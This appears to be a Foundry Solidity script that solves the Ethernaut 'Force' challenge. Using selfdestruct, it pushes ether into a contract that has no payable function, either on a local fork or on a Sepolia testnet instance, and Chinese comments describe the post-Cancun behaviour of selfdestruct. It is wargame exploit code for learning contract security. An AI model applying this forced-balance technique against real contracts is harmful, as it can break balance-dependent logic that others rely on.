// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

interface IForce {}

// $ forge script script/ForceExp.s.sol:ForkExp
// $ forge script script/ForceExp.s.sol:ForkExp --fork-url $SEPOLIA_RPC_URL -vvvvv
contract ForkExp is Script {
    IForce public contractInstance;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    uint256 sendValue = 8 wei; // Amount to send

    function run() external {
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);
        if (chainId == 31337) {
            vm.startPrank(deployer);
            contractInstance = IForce(address(new Force()));
            vm.stopPrank();
        } else if (chainId == 11155111) {
            contractInstance = IForce(payable(0x9bc49902AA3276F364fa6F9Bf5A99E18C8AfB9E7));
        } else {
            return;
        }
        forkTest();
    }

    function forkTest() internal {
        console2.log("Running fork interaction...");
        vm.startPrank(attacker); // Set msg.sender to the attacker address

        uint256 before = address(contractInstance).balance;
        console2.log("Force balance before:", before); // Check initial balance

        // address(contractInstance).call{value: sendValue}(""); // Send 1 ether to the Force contract

        new ForceSend{value: sendValue}(payable(address(contractInstance)));

        DeleteContract deleteContract = new DeleteContract{value: sendValue}(); // Create a new contract that selfdestructs

        console2.log("DeleteContract balance before delete:", deleteContract.getBalance()); // Check the balance of the DeleteContract
        deleteContract.deleteContract(address(contractInstance)); // Call the delete function to selfdestruct and send ether to Force contract
        console2.log("DeleteContract balance after delete:", deleteContract.getBalance()); // Check the balance of the DeleteContract

        uint256 afterBalance = address(contractInstance).balance;
        console2.log("Force balance after:", afterBalance); // Check initial balance
        require(afterBalance == before + sendValue + sendValue, "Balance did not increase correctly");
        vm.stopPrank();
    }
}

// $ forge script script/ForceExp.s.sol:OnChainExp --fork-url $SEPOLIA_RPC_URL -vvvvv
// $ forge script script/ForceExp.s.sol:OnChainExp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
// $ make forceExp ARGS='--network sepolia'
contract OnChainExp is Script {
    // 设置msg.sender为攻击者地址
    // 1 --sender $ACCOUNT_SEPOLIA
    // 2 attackContract.attack(tx.origin);
    // 3 从环境变量中取地址 export ATTACKER=0xYourAddress
    // attackContract.attack(vm.envAddress("ATTACKER"));
    //  vm.startBroadcast(attacker); // 指定广播的地址
    //  attackContract.attack(attacker); // 传入你控制的攻击地址
    IForce public contractInstance = IForce(payable(0x9bc49902AA3276F364fa6F9Bf5A99E18C8AfB9E7)); // Replace with actual deployed address if needed

    function run() external {
        onchainInteract();
    }

    // cast balance 0x9bc49902AA3276F364fa6F9Bf5A99E18C8AfB9E7 --rpc-url $SEPOLIA_RPC_URL --ether
    function onchainInteract() internal {
        console2.log("Chain ID:", block.chainid);
        console2.log("Running onchain interaction...");

        vm.startBroadcast();
        console2.log("contractInstance address:", address(contractInstance));
        uint256 before = address(contractInstance).balance;
        console2.log("Force balance before send:", before); // Check initial balance

        new ForceSend{value: 8 wei}(payable(address(contractInstance)));

        uint256 afterSend = address(contractInstance).balance;
        console2.log("Force balance after send:", afterSend); // Check initial balance

        require(afterSend == before + 8, "Balance did not increase correctly");
        vm.stopBroadcast();
    }
}
// 坎昆升级后删除功能只有在合约创建-自毁这两个操作处在同一笔交易时才能生效
// 其它情况 SELFDESTRUCT仅会被用来将合约中的ETH转移到指定地址

contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
// 以下合约在坎昆升级前可以完成合约的自毁，内部ETH余额的转移
// 在坎昆升级后仅能实现内部ETH余额的转移

contract DeleteContract {
    uint256 public value = 10;

    constructor() payable {}

    receive() external payable {}

    function deleteContract(address _addr) external {
        // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender
        selfdestruct(payable(_addr));
    }

    function getBalance() external view returns (uint256 balance) {
        balance = address(this).balance;
    }
}
